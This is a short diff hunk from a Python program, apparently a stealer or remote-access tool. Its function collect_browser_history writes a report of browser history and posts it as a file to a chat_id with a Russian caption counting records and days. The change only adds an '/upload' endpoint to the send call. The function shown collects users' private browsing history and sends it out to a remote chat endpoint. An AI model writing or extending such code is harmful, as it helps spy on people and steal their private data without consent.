@@ -2375,7 +2375,7 @@ def collect_browser_history(chat_id: str, days: int = 7):
     try:
         with open(tmp_file, "w", encoding="utf-8") as f:
             f.write(report)
-        http_post_multipart(tmp_file, chat_id,
+        http_post_multipart("/upload", tmp_file, chat_id,
                             caption=f"История браузеров ({len(results)} записей, {days} дн.)")
     except Exception as e:
         log.error(f"collect_browser_history send: {e}")
